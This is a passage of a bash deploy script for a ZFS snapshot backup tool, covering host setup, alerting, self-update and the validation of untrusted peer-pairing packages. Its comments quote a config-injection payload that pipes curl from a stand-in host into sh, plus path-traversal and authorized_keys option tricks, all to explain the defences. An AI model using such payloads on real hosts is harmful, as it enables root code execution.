#!/bin/bash
# ------------------------------------------------------------------------------
# deploy.sh -- one script, one host, everything zfs-snapshot-all needs.
#
# Replaces the old deploy_new_server.sh + deploy_backup_user.sh pair. That split
# was historical, not conceptual: it forced an ordering ("run the other one
# first") that lived in a human's head rather than in the code, duplicated the
# helpers and the repo-checkout logic, and produced two separate --check-only
# verdicts for one machine. Everything below runs in the only correct order.
#
# What it does, in order:
#   1 dependencies          6 smoke test of the shipped executables
#   2 repo checkout         7 root auto-pull cron line
#   3 shared alert state    8 delegated non-root account (optional, see below)
#   4 notify + digest
#   5 capacity alerting
#
# Idempotent: safe to re-run, every part skips what is already done. It does NOT
# touch the actual snapsend/snapget/delsnaps job lines -- those are per-host and
# belong to gen-cron.sh.
#
#   bash deploy.sh                      # host setup; maintains an existing
#                                       # delegated account if one is found
#   bash deploy.sh --check-only         # audit, change nothing
#   bash deploy.sh --alerts=immediate   # mail every finding (see below)
#   bash deploy.sh --backup-user=zfsbackup   # also CREATE the delegated account
# ------------------------------------------------------------------------------
set -uo pipefail

# ==============================================================================
#  WHAT THIS HOST GETS -- edit here, or override with a flag for one run
# ==============================================================================
# Where alerts are mailed.
NOTIFY_EMAIL="${NOTIFY_EMAIL:-lurk@lurk.com.pl}"

# daily     = queue findings, ONE summary mail per host per day (default)
# immediate = mail each finding as it happens. Worth setting while bringing a
#             host up: a misconfigured job you hear about within the hour is a
#             five-minute fix, the same mistake read in tomorrow's digest has
#             already cost a night of backups.
# Only used when /etc/zfs-alert.conf does not exist yet -- an existing one is
# never overwritten, so a hand-edited mode survives every re-run.
ALERT_MODE="daily"

# The delegated non-root account. THIS VARIABLE IS ABOUT CREATION, NOT
# MAINTENANCE:
#   empty        -- never create an account, but AUTO-DETECT an existing one and
#                   keep it maintained (scripts, log rotation, alert access)
#   "zfsbackup"  -- create it if missing, then maintain it
# So a bare `bash deploy.sh` does the right thing on every host in the fleet
# without anyone having to remember which machine has an account and which does
# not; creating one stays a deliberate, explicit act.
BACKUP_USER=""
BACKUP_USER_DATASETS="rpool/data rpool/ROOT/pve-1"

REPO_URL="https://github.com/AdalbertKing/zfs-snapshot-all.git"
# Overridable so the self-update tests can drive a throwaway checkout instead
# of the live one. Production never sets these.
REPO_DIR="${REPO_DIR:-/root/scripts/zfs-snapshot-all}"
# Shared state that outlives one run: the alert queue, and the self-update
# bookkeeping below. Defined HERE, in the config block, because the self-update
# path is dispatched near the top of the file and referenced it before its old
# mid-file definition ran -- which made every plain deploy.sh invocation die on
# `ALERT_SHARED_DIR: unbound variable`.
ALERT_SHARED_DIR="${ALERT_SHARED_DIR:-/var/lib/zfs-snapshot-all}"

# The permission set a delegated account needs to run the scripts at all. ONE
# definition, because it is delegated from two unrelated places -- Phase 8 (this
# host's own backup account) and --pair (a pull target's per-peer root). Two
# hand-kept lists is exactly how the 'delegation-verbs' contract rots.
#
# 'bookmark' is easy to leave out and fails quietly: without it every send ends
# "cannot create bookmark ... permission denied", logged as non-fatal, and the
# transfer still succeeds -- so nothing alerts. What is lost is the
# bookmark-backed incremental fallback: once the common-base SNAPSHOT is pruned
# on the source, that pair can only recover with a full resend. Found live on
# metropolis pve1, 2026-07-25.
ZFS_PERMS="snapshot,destroy,send,receive,create,mount,rollback,hold,release,canmount,bookmark"
# ==============================================================================

# PROBLEMS lets --check-only return a meaningful exit code for the WHOLE host,
# account included -- so an audit can be driven from a loop over 18 hosts
# instead of being read by eye.
PROBLEMS=0
log() { echo ">>> $*"; }
warn() { echo "!!! $*" >&2; PROBLEMS=$((PROBLEMS + 1)); }
die() { echo "FATAL: $*" >&2; exit 1; }

CHECK_ONLY=0
SEND_TEST_MAIL=0
# Set when THIS run creates the alert config, i.e. the host is being set up for
# the first time -- the only moment a delivery smoke test proves anything new.
FIRST_TIME_SETUP=0

# ---- peer pairing (--pair/--join) -- see PAIRING-DESIGN.md -----------------
PAIR_MODE=0
JOIN_MODE=0
JOIN_PACKAGE=""
JOIN_CHECK=0
SELF_UPDATE=0
ROLLBACK=0
RESUME_UPDATES=0
# Where an unpacked package lives while it is being checked. Global so the
# EXIT trap can still see it; see do_join.
JOIN_WORKDIR=""
PEER_ROLE="pull"
PEER_HOST=""
PEER_DATASETS=""
PEER_TARGET=""
PEER_AS="delegated"
PEER_PORT="22"
# "22" is also what an omitted --port looks like, so a re-pair or --rotate had
# no way to tell "the admin wants 22" from "the admin didn't say" and quietly
# reset a non-standard port back to the default -- the same drift the manifest
# already guards against for role/target/--as.
PEER_PORT_GIVEN=0
PEER_ROTATE=0
PEER_REVOKE_OLD=0
PEER_DRAFT_CONFIG=0
PEER_UNPAIR=0
# The LOCAL account that will actually run the generated jobs. Independent of
# --as, which names the account on the PEER: one is who we log in as there, the
# other is who runs cron here. Empty means root runs the jobs.
PEER_LOCAL_USER=""
# Opt-in for a --peer name that resolves outside RFC1918. Off by default, see
# assert_peer_address_sane.
PEER_ALLOW_PUBLIC=0

while [ "$#" -gt 0 ]; do
    case "$1" in
        --check-only)   CHECK_ONLY=1; shift ;;
        --test-mail)    SEND_TEST_MAIL=1; shift ;;
        --alerts=*)     ALERT_MODE="${1#*=}"; shift ;;
        --alerts)       ALERT_MODE="${2:-}"; shift 2 ;;
        --backup-user=*) BACKUP_USER="${1#*=}"; shift ;;
        --backup-user)  BACKUP_USER="${2:-}"; shift 2 ;;
        --datasets=*)   BACKUP_USER_DATASETS="${1#*=}"; shift ;;
        --datasets)     BACKUP_USER_DATASETS="${2:-}"; shift 2 ;;
        --email=*)      NOTIFY_EMAIL="${1#*=}"; shift ;;
        --email)        NOTIFY_EMAIL="${2:-}"; shift 2 ;;
        --pair)         PAIR_MODE=1; shift ;;
        --join=*)       JOIN_MODE=1; JOIN_PACKAGE="${1#*=}"; shift ;;
        --join)         JOIN_MODE=1; JOIN_PACKAGE="${2:-}"; shift 2 ;;
        --self-update)     SELF_UPDATE=1; shift ;;
        --rollback)        ROLLBACK=1; shift ;;
        --resume-updates)  RESUME_UPDATES=1; shift ;;
        --join-check=*) JOIN_CHECK=1; JOIN_PACKAGE="${1#*=}"; shift ;;
        --join-check)   JOIN_CHECK=1; JOIN_PACKAGE="${2:-}"; shift 2 ;;
        --role=*)       PEER_ROLE="${1#*=}"; shift ;;
        --role)         PEER_ROLE="${2:-}"; shift 2 ;;
        --peer=*)       PEER_HOST="${1#*=}"; shift ;;
        --peer)         PEER_HOST="${2:-}"; shift 2 ;;
        --peer-datasets=*) PEER_DATASETS="${1#*=}"; shift ;;
        --peer-datasets)   PEER_DATASETS="${2:-}"; shift 2 ;;
        --target=*)     PEER_TARGET="${1#*=}"; shift ;;
        --target)       PEER_TARGET="${2:-}"; shift 2 ;;
        --as=*)         PEER_AS="${1#*=}"; shift ;;
        --as)           PEER_AS="${2:-}"; shift 2 ;;
        --port=*)       PEER_PORT="${1#*=}"; PEER_PORT_GIVEN=1; shift ;;
        --port)         PEER_PORT="${2:-}"; PEER_PORT_GIVEN=1; shift 2 ;;
        --local-user=*) PEER_LOCAL_USER="${1#*=}"; shift ;;
        --local-user)   PEER_LOCAL_USER="${2:-}"; shift 2 ;;
        --allow-public-peer) PEER_ALLOW_PUBLIC=1; shift ;;
        --rotate)       PEER_ROTATE=1; shift ;;
        --revoke-old)   PEER_REVOKE_OLD=1; shift ;;
        --draft-config) PEER_DRAFT_CONFIG=1; shift ;;
        # Implies --pair so it reads as the opposite of it -- `--unpair --peer=X`
        # rather than the `--pair --unpair` the other sub-modes would suggest.
        --unpair)       PEER_UNPAIR=1; PAIR_MODE=1; shift ;;
        -h|--help)
            cat <<'USAGE'
Usage: deploy.sh [options]
  --check-only            audit only; install, create and modify nothing
  --test-mail             send a delivery smoke test (automatic on first setup only)
  --alerts=daily          (default) queue findings, one summary mail per day
  --alerts=immediate      mail each finding at once -- use while bringing a host up
  --backup-user=NAME      also create the delegated non-root account NAME.
                          Omit it and an EXISTING account is still detected and
                          maintained; only creation needs to be asked for.
  --datasets="A B"        datasets to delegate to that account
  --email=ADDR            where alerts are mailed
Defaults are the config block at the top of this script -- edit them there to
make them permanent for a host.

Peer pairing -- two hosts with NO prior trust (see PAIRING-DESIGN.md):
  --pair                  initiate pairing with a peer (run on the host that
                          will connect: the collector for --role=pull, the
                          source for --role=push)
    --role=pull|push        pull (default): this host pulls via snapget.sh.
                            push: this host pushes via snapsend.sh.
    --peer=HOST             the other host's hostname/IP
    --peer-datasets="A B"   datasets involved in this relationship
    --target=DATASET        where snapshots land -- local dataset for pull,
                            remote dataset (on the peer) for push
    --as=root|delegated     delegated (default): isolated per-peer account on
                            the peer. root: parity with today's clustered
                            hosts -- no isolation, use only when the hosts
                            already fully trust each other
    --local-user=NAME       the account HERE that will run the generated jobs
                            (e.g. zfsbackup). Installs a readable copy of the
                            pairing key AND of the peer's pinned host key for
                            it, and for --role=pull delegates the target root
                            to it. Independent of --as, which is about the
                            account on the PEER. Omit and the jobs are assumed
                            to run as root.
    --port=N                ssh port (default 22)
    --allow-public-peer     accept a --peer NAME that resolves outside RFC1918
                            (refused by default -- see the note on search
                            domains in PAIRING-DESIGN.md). Not needed when
                            --peer is a literal IP address.
    --rotate                generate a new key alongside the existing one
    --revoke-old             finish a rotation: remove the old key on both ends
    --draft-config           after --join has run on the peer: list its
                            datasets and write a reviewed-by-hand .suggested
                            file (never installs anything)
    --unpair                end the relationship on THIS host (keys, pinned
                            host key, manifest, local delegation) and print
                            the commands to run on the peer. Never touches
                            received data, and refuses while a cron line
                            still uses the pairing key.
  --join=PACKAGE          consume a wsad produced by --pair on the OTHER host
                          (run on the second host, once, from its console)
USAGE
            exit 0 ;;
        *) echo "unknown option: $1 (try --help)" >&2; exit 2 ;;
    esac
done
case "$ALERT_MODE" in
    daily|immediate) ;;
    *) echo "--alerts must be 'daily' or 'immediate', got '$ALERT_MODE'" >&2; exit 2 ;;
esac
case "$PEER_ROLE" in
    pull|push) ;;
    *) echo "--role must be 'pull' or 'push', got '$PEER_ROLE'" >&2; exit 2 ;;
esac
case "$PEER_AS" in
    root|delegated) ;;
    *) echo "--as must be 'root' or 'delegated', got '$PEER_AS'" >&2; exit 2 ;;
esac
if [ "$PAIR_MODE" -eq 1 ] && [ "$JOIN_MODE" -eq 1 ]; then
    echo "--pair and --join are mutually exclusive" >&2; exit 2
fi
if [ "$PEER_UNPAIR" -eq 1 ]; then
    [ -n "$PEER_HOST" ] || { echo "--unpair requires --peer=NAME" >&2; exit 2; }
    # Every other sub-mode maintains a relationship; this one ends it. Combining
    # them is always a mistake, and the one that would hurt is --unpair --rotate
    # (generate a key, then delete it).
    if [ "$PEER_ROTATE" -eq 1 ] || [ "$PEER_REVOKE_OLD" -eq 1 ] || [ "$PEER_DRAFT_CONFIG" -eq 1 ]; then
        echo "--unpair cannot be combined with --rotate/--revoke-old/--draft-config" >&2; exit 2
    fi
fi
# --local-user names an account on THIS host, so it can be checked before any
# state is touched. Refusing here (rather than silently skipping the key copy
# and the delegation) keeps a typo from producing a pairing that looks complete
# and fails at 2am with "permission denied".
if [ -n "$PEER_LOCAL_USER" ]; then
    if [ "$PAIR_MODE" -eq 0 ] || [ "$PEER_UNPAIR" -eq 1 ]; then
        echo "--local-user only applies to --pair (on --unpair the account comes from the manifest)" >&2; exit 2
    fi
    if ! id "$PEER_LOCAL_USER" >/dev/null 2>&1; then
        echo "--local-user='$PEER_LOCAL_USER' does not exist on this host -- create it first: bash deploy.sh --backup-user=$PEER_LOCAL_USER" >&2
        exit 2
    fi
fi
if { [ "$PAIR_MODE" -eq 1 ] || [ "$JOIN_MODE" -eq 1 ]; } && [ "$CHECK_ONLY" -eq 1 ]; then
    echo "--check-only cannot be combined with --pair/--join -- these mutate state by design (new keys, new accounts, new grants)" >&2
    exit 2
fi
if [ "$PAIR_MODE" -eq 1 ] && [ -z "$PEER_HOST" ]; then
    echo "--pair requires --peer=HOST" >&2; exit 2
fi
if [ $(( PEER_ROTATE + PEER_REVOKE_OLD + PEER_DRAFT_CONFIG )) -gt 1 ]; then
    echo "--rotate, --revoke-old and --draft-config are mutually exclusive -- pick one" >&2
    exit 2
fi

# Used by --join/--join-check to identify a key; lives up here because the
# package handling below runs before the rest of this script is even defined.
pubkey_fingerprint() {
    ssh-keygen -lf "$1" 2>/dev/null | awk '{print $2}'
}

# ============================================================================
# The wsad package is UNTRUSTED STRUCTURED DATA, not code.
#
# --join runs as root on a host that has no relationship with the sender yet --
# that is the entire point of the feature. It used to consume the package with
# `. "$workdir/peer.conf"`, and `source` is not a way of reading configuration:
# it is a way of executing a file. A package containing
#     PEER_CONF_ROLE=pull; curl http://x/y | sh
# ran that as root. No parser bug required; command execution is the documented
# behaviour of the operation that was used. Reported as F1 (P0) in
# docs/reviews/REV-20260729-001.md and confirmed in the source before fixing.
#
# The archive was also extracted before anyone checked what was in it, so path
# traversal, absolute paths, symlinks and extra payload members all had a free
# ride.
#
# There is a second-order sink worth naming: --join writes the values it read
# into a manifest that later runs get through `.` again. A value carrying a
# newline would therefore inject whole lines into a file that IS sourced, later,
# by a different invocation. The grammar checks below are what closes that too,
# which is why they reject control characters rather than merely quoting well.
# ============================================================================

# Exactly two members, exact names, nothing else. This one check covers most of
# the archive attacks by itself: '../../etc/cron.d/payload', an absolute path,
# a duplicate peer.conf and any extra member are all "not exactly these two
# names, once each".
#
# A member name containing a newline could split into two lines that LOOK like
# the expected pair; that is caught after extraction instead, where the file
# with the real (newline-bearing) name is not a regular file at either path.
# Conservative bounds. A legitimate wsad is one or two kilobytes; nothing here
# is a judgement call about what is "big enough", it is a refusal to let an
# untrusted file decide how much disk root spends before anything has agreed the
# file is even the right shape.
PKG_MAX_COMPRESSED=65536
PKG_MAX_MEMBER=8192

assert_package_members() {
    local pkg="$1"

    local size; size=$(wc -c < "$pkg" 2>/dev/null) || die "could not size $pkg"
    [ "$size" -le "$PKG_MAX_COMPRESSED" ] \
        || die "$pkg is ${size} bytes, over the ${PKG_MAX_COMPRESSED}-byte limit for a wsad -- a real one is a couple of kilobytes. Refusing to decompress it."

    local names
    names=$(tar -tzf "$pkg" 2>/dev/null) || die "could not read $pkg -- not a valid wsad (expected a gzipped tar)"
    local expected; expected=$(printf 'peer.conf\npubkey.pub\n')
    local got; got=$(printf '%s\n' "$names" | grep -v '^$' | sort)
    [ "$got" = "$expected" ] || die "$pkg does not contain exactly the two expected members. Found: $(printf '%s' "$names" | tr '\n' ' ')-- a wsad is peer.conf + pubkey.pub and nothing else. Refusing to unpack it."

    # Entry TYPES, before extraction rather than after. Checking `-f` on the
    # unpacked result was the earlier approach and it is too late by
    # construction: a FIFO or device node has already been created by root at
    # that point, and a hard link arrives as an ordinary regular file that no
    # test on the result can tell apart. The verbose listing's first character
    # is the type -- '-' regular, 'l' symlink, 'h' hard link, 'd' directory,
    # 'p' FIFO, 'b'/'c' device.
    local listing; listing=$(tar -tzvf "$pkg" 2>/dev/null) \
        || die "could not list $pkg -- not a valid wsad"
    local line type sz
    while IFS= read -r line; do
        [ -n "$line" ] || continue
        type="${line:0:1}"
        case "$type" in
            -) ;;
            l) die "a wsad member is a symlink -- only regular files are accepted" ;;
            h) die "a wsad member is a hard link -- only regular files are accepted" ;;
            d) die "a wsad member is a directory -- only regular files are accepted" ;;
            p) die "a wsad member is a FIFO -- only regular files are accepted" ;;
            b|c) die "a wsad member is a device node -- only regular files are accepted" ;;
            *) die "a wsad member has an unexpected archive entry type '$type' -- only regular files are accepted" ;;
        esac
        # Declared size, so a decompression bomb is refused before it is
        # expanded rather than after.
        sz=$(printf '%s\n' "$line" | awk '{print $3}')
        case "$sz" in
            ''|*[!0-9]*) die "cannot read a member's declared size from the archive listing -- refusing to extract something this script cannot describe" ;;
        esac
        [ "$sz" -le "$PKG_MAX_MEMBER" ] \
            || die "a wsad member declares ${sz} bytes, over the ${PKG_MAX_MEMBER}-byte limit -- peer.conf and pubkey.pub are a few hundred bytes each"
    done <<< "$listing"
}

# Validate and extract ONE private copy, never the caller's path.
#
# The package used to be opened twice -- once by the preflight, once by the
# extraction -- so if it sat in a directory another account can write, the bytes
# that were checked need not be the bytes that got extracted as root. It also
# meant --join-check could never be evidence about a later --join, since each
# reopened the path independently. Copying first collapses both problems: from
# the copy onward there is exactly one artifact, and its SHA-256 is printed so
# the two commands can be compared by hand.
prepare_package() {
    local pkg="$1"
    [ -r "$pkg" ] || die "cannot read wsad package: $pkg"
    JOIN_WORKDIR=$(mktemp -d) || die "mktemp -d failed"
    chmod 700 "$JOIN_WORKDIR"
    # GLOBAL, not local: the trap below runs at shell exit, by which time a
    # function-local variable is out of scope -- under `set -u` the trap then
    # dies on an unbound variable and removes nothing at all.
    trap 'rm -rf "${JOIN_WORKDIR:-}"' EXIT

    local copy="$JOIN_WORKDIR/wsad.tgz"
    # install, not cp: mode and ownership are set as the file is created, so
    # there is no window where it exists with the source's permissions.
    install -m 600 "$pkg" "$copy" || die "could not take a private copy of $pkg"

    PKG_SHA256=$(sha256sum "$copy" 2>/dev/null | cut -d' ' -f1)
    assert_package_members "$copy"
    tar --no-same-owner --no-same-permissions -C "$JOIN_WORKDIR" -xzf "$copy" \
        || die "could not unpack $pkg -- not a valid wsad?"
    local f
    for f in peer.conf pubkey.pub; do
        [ -L "$JOIN_WORKDIR/$f" ] && die "$f in the package is a symlink -- a wsad holds two regular files"
        [ -f "$JOIN_WORKDIR/$f" ] || die "$f did not unpack as a regular file -- refusing to read it"
    done
    parse_peer_conf "$JOIN_WORKDIR/peer.conf"
    validate_peer_conf
    validate_pubkey_file "$JOIN_WORKDIR/pubkey.pub"
}

# --- peer.conf: parsed by allow-list, never executed ------------------------
declare -A PC=()

# Grammar helpers, deliberately narrow. Every one of these values ends up as a
# useradd argument, a ZFS dataset name, a path component or a manifest line, and
# each of those has its own way of turning a surprising character into a
# surprise.
# A character allow-list is not a grammar. These values are handed to `zfs
# list`, `zfs create` and `zfs allow`, where a leading '-' is an OPTION no
# amount of quoting turns back into a name -- the same trap delsnaps.sh already
# hit once and fixed with `--`, which had not propagated here. Dot segments are
# refused for the same reason a path library refuses them: '.' and '..' are
# navigation, not names, and this contract has no use for either.
pc_is_dataset() {
    local v="$1" comp rest
    case "$v" in
        ""|/*|*/) return 1 ;;
        *[!A-Za-z0-9_.:/-]*) return 1 ;;
        *//*) return 1 ;;
        -*) return 1 ;;   # first component would be read as an option
        .*) return 1 ;;   # and a pool does not begin with a dot
    esac
    rest="$v"
    while : ; do
        comp="${rest%%/*}"
        case "$comp" in
            ""|.|..) return 1 ;;
        esac
        [ "$rest" = "$comp" ] && break
        rest="${rest#*/}"
    done
    return 0
}
pc_is_account() {
    case "$1" in
        ""|*[!a-z0-9_-]*|[!a-z_]*) return 1 ;;
    esac
    [ "${#1}" -le 32 ] || return 1
    return 0
}
pc_is_label() {
    case "$1" in
        ""|.|..|*[!A-Za-z0-9._-]*) return 1 ;;
    esac
    [ "${#1}" -le 64 ] || return 1
    return 0
}
pc_is_port() {
    case "$1" in
        ""|*[!0-9]*) return 1 ;;
    esac
    [ "$1" -ge 1 ] && [ "$1" -le 65535 ]
}

parse_peer_conf() {
    local file="$1" line key val n=0
    while IFS= read -r line || [ -n "$line" ]; do
        n=$((n + 1))
        # A package written on a CRLF box is a format problem to report, not a
        # stray \r to carry into a username.
        line="${line%$'\r'}"
        case "$line" in ''|'#'*) continue ;; esac
        case "$line" in *=*) ;; *) die "peer.conf line $n is not a KEY=VALUE assignment: '$line'" ;; esac
        key="${line%%=*}"
        val="${line#*=}"
        case "$key" in
            PEER_CONF_ROLE|PEER_CONF_DATASETS|PEER_CONF_TARGET|PEER_CONF_AS|\
            PEER_CONF_ACCOUNT|PEER_CONF_PORT|PEER_CONF_INITIATOR_LABEL) ;;
            *) die "peer.conf line $n has unknown key '$key' -- a wsad has a fixed set of keys and anything else means the package was not produced by --pair" ;;
        esac
        [ -z "${PC[$key]+x}" ] || die "peer.conf has '$key' twice (line $n) -- refusing to guess which one was meant"
        # One optional layer of double quotes, as --pair writes for DATASETS.
        case "$val" in
            \"*\") val="${val#\"}"; val="${val%\"}" ;;
        esac
        # Nothing that only matters when a string is EXECUTED has any business
        # in a file that is only ever read.
        case "$val" in
            *[\"\'\\\$\`]*) die "peer.conf value for '$key' contains a quote, backslash, \$ or backtick -- these have no meaning in a value that is never executed, and every reason to be there is a bad one" ;;
            *[!\ [:print:]]*) die "peer.conf value for '$key' contains a control character" ;;
        esac
        PC["$key"]="$val"
    done < "$file"
}

validate_peer_conf() {
    local k ds
    for k in PEER_CONF_ROLE PEER_CONF_TARGET PEER_CONF_ACCOUNT PEER_CONF_AS \
             PEER_CONF_INITIATOR_LABEL; do
        [ -n "${PC[$k]:-}" ] || die "peer.conf is missing $k (or it is empty) -- not a valid wsad"
    done
    case "${PC[PEER_CONF_ROLE]}" in
        pull|push) ;;
        *) die "peer.conf PEER_CONF_ROLE='${PC[PEER_CONF_ROLE]}' -- must be 'pull' or 'push'" ;;
    esac
    case "${PC[PEER_CONF_AS]}" in
        root|delegated) ;;
        *) die "peer.conf PEER_CONF_AS='${PC[PEER_CONF_AS]}' -- must be 'root' or 'delegated'" ;;
    esac
    pc_is_dataset "${PC[PEER_CONF_TARGET]}" \
        || die "peer.conf PEER_CONF_TARGET='${PC[PEER_CONF_TARGET]}' is not a valid ZFS dataset name"
    pc_is_account "${PC[PEER_CONF_ACCOUNT]}" \
        || die "peer.conf PEER_CONF_ACCOUNT='${PC[PEER_CONF_ACCOUNT]}' is not a valid account name (this string is passed to useradd)"
    pc_is_label "${PC[PEER_CONF_INITIATOR_LABEL]}" \
        || die "peer.conf PEER_CONF_INITIATOR_LABEL='${PC[PEER_CONF_INITIATOR_LABEL]}' is not a valid label (it becomes a path component)"
    if [ -n "${PC[PEER_CONF_PORT]:-}" ]; then
        pc_is_port "${PC[PEER_CONF_PORT]}" \
            || die "peer.conf PEER_CONF_PORT='${PC[PEER_CONF_PORT]}' is not a port number in 1..65535"
    fi
    for ds in ${PC[PEER_CONF_DATASETS]:-}; do
        pc_is_dataset "$ds" || die "peer.conf PEER_CONF_DATASETS contains '$ds', which is not a valid ZFS dataset name"
    done
    if [ "${PC[PEER_CONF_ROLE]}" = "pull" ] && [ -z "${PC[PEER_CONF_DATASETS]:-}" ]; then
        die "peer.conf declares role=pull but lists no datasets -- there would be nothing to delegate"
    fi
}

# Exactly ONE public key, and one that cannot smuggle authorized_keys options.
# `command="..." ssh-ed25519 AAAA...` is a perfectly well-formed authorized_keys
# line; requiring the record to START with a key type is what refuses it.
validate_pubkey_file() {
    local f="$1" lines first
    lines=$(grep -c '[^[:space:]]' "$f" 2>/dev/null || echo 0)
    [ "$lines" -eq 1 ] || die "pubkey.pub must hold exactly one public key, found $lines non-blank lines"
    first=$(grep -m1 '[^[:space:]]' "$f")
    case "$first" in
        ssh-ed25519\ *|ssh-rsa\ *|ecdsa-sha2-nistp256\ *|ecdsa-sha2-nistp384\ *|\
        ecdsa-sha2-nistp521\ *|sk-ssh-ed25519@openssh.com\ *|sk-ecdsa-sha2-nistp256@openssh.com\ *) ;;
        *) die "pubkey.pub does not start with a public key type -- an authorized_keys options prefix (command=\"...\", environment=\"...\") is not accepted here" ;;
    esac
    case "$first" in
        *[!\ [:print:]]*) die "pubkey.pub contains a control character" ;;
    esac
    ssh-keygen -lf "$f" >/dev/null 2>&1 \
        || die "pubkey.pub is not a public key OpenSSH can read"
}

# do_join_check -- everything --join does to a package before it is willing to
# believe it, and then nothing. Prints the normalised values so a legitimate
# package can be inspected, and exits non-zero on the first thing it does not
# like. Useful on its own (look before you run it as root on a box that trusts
# nobody), and it is what makes the trust boundary testable without root.
do_join_check() {
    [ -n "$JOIN_PACKAGE" ] || die "--join-check needs a package path"
    prepare_package "$JOIN_PACKAGE"
    echo "package OK: $JOIN_PACKAGE"
    printf '  %-26s %s
' "sha256" "${PKG_SHA256:-?}"
    local k
    for k in PEER_CONF_ROLE PEER_CONF_AS PEER_CONF_ACCOUNT PEER_CONF_TARGET              PEER_CONF_DATASETS PEER_CONF_PORT PEER_CONF_INITIATOR_LABEL; do
        printf '  %-26s %s
' "$k" "${PC[$k]:-}"
    done
    printf '  %-26s %s
' "pubkey" "$(pubkey_fingerprint "$JOIN_WORKDIR/pubkey.pub")"
    return 0
}

# --join-check validates a package and exits. It changes nothing, reads nothing
# outside the package, and therefore has no reason to demand root -- which also
# makes the trust boundary testable on any machine, instead of only on a host
# where a mistake in the test would create a real account. It runs BEFORE the
# root check for exactly that reason.
if [ "$JOIN_CHECK" -eq 1 ]; then
    do_join_check
    exit $?
fi

# --join's PREFLIGHT, hoisted here on purpose. do_join itself validated before
# its own mutations, but it is dispatched only after Phases 1-7 -- package
# installation, the checkout update, cron changes. So a hostile package still
# provoked all of those before anything looked at it, which is not what "no
# persistent change before validation" means. Validate first, keep the result,
# and let do_join use it later instead of parsing a second, independent copy.
if [ "$JOIN_MODE" -eq 1 ]; then
    [ -n "$JOIN_PACKAGE" ] || die "--join needs a package path"
    prepare_package "$JOIN_PACKAGE"
    log "package preflight OK (sha256 ${PKG_SHA256:-?}) -- continuing with deployment phases"
fi

# ============================================================================
# Self-update: the hourly pull, a rollback that STAYS rolled back, and an
# explicit way to resume.
#
# REV-20260729-003 F1. The previous version was one cron line:
#
#     git rev-parse HEAD > last-known-good; git pull --ff-only origin main
#
# which recorded the CURRENT revision every hour whether anything changed or
# not. So an hour after a bad update the recorded "rollback point" was the bad
# revision itself, and a `git reset --hard` was undone by the next hourly pull
# sixty minutes later. The file was also called last-known-good while nothing
# established that anything was good.
#
# Renamed to what it is (the previous revision), written ONLY on a real change,
# and rollback now leaves a hold that stops the next run from undoing it.
#
# REV-20260729-004 F1/F2/F3 (verification of the above): the reviewer found
# three problems with that first pass, all fixed here:
#
#  F1 -- the state dir defaulted to $ALERT_SHARED_DIR, which Phase 4 makes
#        2775 root:zfsalert ON PURPOSE so a delegated backup account can queue
#        alert data. Group-write on the DIRECTORY also let that account
#        remove/replace previous-revision or update-hold -- i.e. undo an
#        administrator's rollback, or swap a state file for a symlink before
#        root next wrote it. A backup account has no business deciding what
#        root's next `git reset --hard` targets. Moved to a root-private
#        directory under /root (already 0700, same reasoning Phase 4 already
#        uses to keep notify-fail's own scripts out of that account's reach),
#        and every access now refuses a symlinked directory or state file
#        instead of following it.
#  F2 -- every state write used to be an unchecked `>` redirect under
#        `set -uo pipefail` (not `set -e`): a write failure was silently
#        ignored and the caller kept going as if it had succeeded. All state
#        transitions below are checked, and a write that cannot be trusted
#        stops the operation rather than reporting success on top of it.
#  F3 -- `--self-update` ran `merge --ff-only` without ever asking whether the
#        worktree was clean. `--ff-only` happily keeps a local modification in
#        a file the incoming commits never touched, so the host would then run
#        a mix of reviewed code and unreviewed local edits, as root. Checked
#        explicitly now, before any state is touched.
# ============================================================================
UPDATE_STATE_DIR="${UPDATE_STATE_DIR:-/root/.zfs-snapshot-all-update-state}"
PREV_REV_FILE="$UPDATE_STATE_DIR/previous-revision"
UPDATE_HOLD_FILE="$UPDATE_STATE_DIR/update-hold"

# Fails closed: a symlinked or group/world-writable state directory is treated
# as untrustworthy and stops the caller rather than being used anyway. Every
# do_* function below calls this before touching $PREV_REV_FILE/$UPDATE_HOLD_FILE.
ensure_update_state_dir() {
    if [ -L "$UPDATE_STATE_DIR" ]; then
        warn "$UPDATE_STATE_DIR is a symlink -- refusing to follow it. Remove it by hand and re-run: ls -la $UPDATE_STATE_DIR"
        return 1
    fi
    if [ -e "$UPDATE_STATE_DIR" ] && [ ! -d "$UPDATE_STATE_DIR" ]; then
        warn "$UPDATE_STATE_DIR exists and is not a directory -- refusing to use it."
        return 1
    fi
    if [ ! -e "$UPDATE_STATE_DIR" ]; then
        mkdir -m 0700 -p "$UPDATE_STATE_DIR" || { warn "mkdir -p $UPDATE_STATE_DIR failed"; return 1; }
    fi
    local _mode
    _mode=$(stat -c '%a' "$UPDATE_STATE_DIR" 2>/dev/null) || { warn "cannot stat $UPDATE_STATE_DIR"; return 1; }
    # Bitwise, not glob-on-the-last-digit: 0022 isolates group-write(0020) and
    # other-write(0002) regardless of an extra setuid/setgid/sticky leading
    # digit in $_mode (e.g. a stray 2775 must still be caught).
    if [ $(( 0${_mode} & 0022 )) -ne 0 ]; then
        warn "$UPDATE_STATE_DIR is group- or world-writable (mode $_mode) -- refusing to trust it as update-control state. Fix: chmod 0700 $UPDATE_STATE_DIR"
        return 1
    fi
    return 0
}

# Atomic and symlink-hostile: `printf ... > "$dst"` opens $dst by name, which
# FOLLOWS a symlink there and writes through it -- exactly the swap a
# delegated account could set up (F1). `rename(2)`, which `mv` uses, replaces
# the directory ENTRY instead, so writing into a private tmpfile first and
# renaming it over $dst is safe even if $dst is currently a symlink: the
# rename clobbers the link itself, never the link's target.
write_state_file() {
    local dst="$1" content="$2" tmp
    if [ -L "$dst" ]; then
        warn "$dst is a symlink -- refusing to write through it. Remove it by hand: ls -la $dst"
        return 1
    fi
    tmp=$(mktemp "$UPDATE_STATE_DIR/.tmp.XXXXXX" 2>/dev/null) || { warn "mktemp in $UPDATE_STATE_DIR failed"; return 1; }
    if ! printf '%s\n' "$content" > "$tmp" 2>/dev/null; then
        warn "write to $tmp failed"; rm -f "$tmp"; return 1
    fi
    if ! mv -f "$tmp" "$dst" 2>/dev/null; then
        warn "rename $tmp -> $dst failed"; rm -f "$tmp"; return 1
    fi
    return 0
}

# Companion read: refuses a symlinked source instead of following it (a plain
# `cat` would happily print whatever the link points at).
read_state_file() {
    local src="$1"
    if [ -L "$src" ]; then
        warn "$src is a symlink -- refusing to read through it. Remove it by hand: ls -la $src"
        return 1
    fi
    [ -f "$src" ] || return 1
    cat "$src" 2>/dev/null
}

# `rm -f` on a symlink only ever removes the link entry, never its target --
